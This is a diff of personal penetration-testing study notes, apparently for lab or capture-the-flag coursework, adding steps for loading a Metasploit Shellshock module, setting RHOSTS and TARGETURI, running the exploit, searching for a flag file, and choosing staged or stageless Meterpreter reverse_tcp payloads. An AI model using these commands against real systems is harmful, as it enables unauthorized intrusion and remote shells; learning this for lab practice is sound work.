@@ -461,7 +461,7 @@ Response codes: `200` ok, `400` error, `500` server error, `300` is redirect
 - When researching about a new vulnerability, questions to ask: What does it do. Which OS versions does it effect, which company was a target. Any pertinent details OpenSSL 
 
 
-- **Metasploit**
+- **Metasploit** - The commands are not case sensitive
 
 You can search by the name of the modules for example after metasploit is loaded (with `search java`, search `shellshock`)
 
@@ -471,11 +471,22 @@ You can search by the name of the modules for example after metasploit is loaded
     
  - `payload/firefox/gather/cookies` is a payload module.
 
- If i want to use a particular module then I can type the `use` command and then the path to whatever module I want to run
+ If i want to use a particular module then I can type the `use` command and then the path to whatever module I want to load. This load will runn with the shell shock exploit
 
  - `auxiliary/scanner/http/apache_mod_cgi_bash_env`
 
 
+- Next I can type `info` to learn about what the module does, then I can type `options` to get info about the reuired configurations, then I use `set` to set the configurations and then I type `run` or `exploit` to execute the module as below
+
+-`set RHOSTS <victim ip address` This almost always need to be set
+-`set TARGETURI /cgi-bin/vulnerable` This is the path to use the exploit module
+
+> Some Additional command to run the shell and finding files using the find command
+- Run: `shell` to get the shell command. 
+- Run: `cd /` to the current directory to the root directory. 
+- Run: `find . -iname flag` to find the flag file. 
+
+>TCM 
 
 - `msfconsole`
 - `getuid` if yout type this after establishing a session then you will be able to se whether what level of access we were able to obtain. if its **NT AUthorization** then its the highest level
@@ -491,6 +502,12 @@ You can search by the name of the modules for example after metasploit is loaded
 
 - Once you are able to connect. The next step is sending the malware script 
 
+
+## Post-Exploitation
+
+- Once you are able to break into a machine you can run **Meterpreter** on the target or transfer `payloads`. The payloads
+
+- Payloads are **staged** (the payload is assembled in multiple parts) or **stageless** (all sent at once). A large size payload is likely to fail
 
 - `set payload windows/x64/meterpreter` see if the options for the staged show up. The goal is to just try an alternative with staged approach if the non-staged approach does not work
 - `set payload windows/x64/meterpreter/reverse_tcp` - Note that this is at the exploit level and before you have established the connection
